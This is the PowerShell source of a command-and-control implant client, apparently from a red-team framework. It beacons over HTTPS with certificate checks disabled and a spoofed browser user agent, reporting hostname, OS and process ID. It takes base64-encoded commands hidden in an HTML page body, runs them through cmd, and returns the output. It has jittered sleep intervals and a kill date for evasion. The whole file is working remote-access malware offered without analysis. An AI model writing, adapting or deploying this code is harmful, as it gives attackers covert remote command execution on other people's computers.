# License: GPL-3.0

################################
# Client Configs
################################
$Page = "/main.css"
$SleepMin = 5
$SleepMax = 10
$KillDate = "2022-01-31"
$SecretKey = '000000000000000116s92k48dss923j640s234v849c2001qi231d950g3s9df01esdr'

################################
# Client Info
################################
$HostName = $env:COMPUTERNAME
$OsVersion = [environment]::OSVersion.VersionString
$Type = "ps1"
$Protocol = "HTTPS"

Function b64encode($data){
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)
}

Function b64decode($data){
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data))
}

Function http_request($SendData) {
    try {
        write-debug "Sending: $SendData"
        # Ignore Cert Issues
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;

        # Create HTTPS Request
        $req = New-Object System.Net.WebClient

        # Add Headers
        $req.Headers.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
        $req.Headers.Add('Secret-Key', $SecretKey)
        $req.Headers.Add('Hostname', $HostName)
        $req.Headers.Add('OS', $OsVersion)
        $req.Headers.Add('PID', $PID)
        $req.Headers.Add('TYPE', $Type)
        $req.Headers.Add('PROTOCOL', $Protocol)

        # Encode & Add Send Data
        $data = b64encode($SendData)
        $req.Headers.Add('Data', $data)

        # Response
        $response = $req.downloadString("https://"+$ServerIP +":"+ $Port + $Page)
        return $response
    }
    catch {
        Write-warning $_.Exception.Message
    }
}

Function ChangeSleep($t1,$t2) {
    $SleepMin = $t1
    $SleepMax = $t2
}

# Manage Client CMD
Function CmdHandler($cmd) {
    try {
        # Close client
        If($cmd -eq "close"){
            http_request($HostName + "Closed.")
            exit
        }

        # Change Sleep Time
        ElseIf ($cmd.StartsWith("stealth")) {
            $tmp = $cmd.split(" ")[1].split("-")
            $t1 = [int]$tmp[0]
            $t2 = [int]$tmp[1]
            Set-Variable -scope 1 -Name "SleepMin" -Value $t1
            Set-Variable -scope 1 -Name "SleepMax" -Value $t2
            $resp = "[+] Sleep Intervals changed: $SleepMin-$SleepMax"
        }

        # Change Client kill date
        ElseIf ($cmd.StartsWith("change_date")) {
            $tmp = $cmd.split(" ")[1]
            Set-Variable -Scope 1 -Name "KillDate" -Value "$tmp"
            $resp = "[+] Kill Date Changed: $KillDate"
        }

            # Execute Command
        Else {
                $resp = (cmd /Q /c $cmd 2>&1 ) | Out-String
        }
        http_request($resp)
    }
    catch {
        write-warning $_.Exception.Message
        http_request("[-] Error in cmd_handler: $_.Exception.Message")
    }
}

# Extract command from HTTP Response
Function Parse-HttpResponse($Data) {
    try {
        $tmp = $Data -split "<body>"
        $cmd = $tmp[1] -split "</body>"
        $cmd = $cmd[0].trim()
        if( -Not $cmd) {
            return $false
        }
	    $tmp=b64decode($cmd)
        return [string]$tmp
    }
    catch {
	    write-warning $_.Exception.Message
        return $false
    }
}

# Check for Debug Param
Function Invoke-Client {
    ################################
    # Client.ps1 Params
    ################################
    param(
        [string]$ServerIP = "127.0.0.1",
        [int]$Port=443,
        [switch]$Debug=$false
    )

    if ($Debug) { $DebugPreference = 'Continue' }
    # Main Loop
    while ($true) {
        # Verify within dates of operation
        $now = (Get-Date).ToString('yyyy-MM-dd')
        $kd = (Get-Date $KillDate).ToString('yyyy-MM-dd')
        if ($kd -gt $now)
        {
            try
            {
                # Checkin/ Get Command
                $HttpResp = http_request("check-in")
                $RawData = Parse-HttpResponse($HttpResp)
                # Execute Command
                if ($RawData)
                {
                    CmdHandler($RawData)
                }
            }

            catch
            {
                write-warning $_.Exception.Message
            }

            # Sleep
            $s = Get-Random -Maximum $SleepMax -Minimum $SleepMin
            write-debug "Sleeping: $s Seconds."
            start-sleep -Seconds $s
        }

        Else {
            Break
        }
    }

    # Send closing message before exiting
    http_request($HostName + "Closed.")
}